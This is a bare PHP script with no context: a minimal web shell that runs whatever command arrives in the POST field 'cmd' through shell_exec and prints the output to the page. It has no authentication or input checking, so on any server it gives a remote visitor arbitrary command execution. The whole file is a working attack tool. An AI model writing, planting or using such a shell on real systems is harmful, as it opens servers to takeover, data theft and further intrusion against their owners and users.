<?php
$cmd = $_POST["cmd"] ;
$data = shell_exec("$cmd 2>&1");
echo "<pre> $data </pre>";
?>
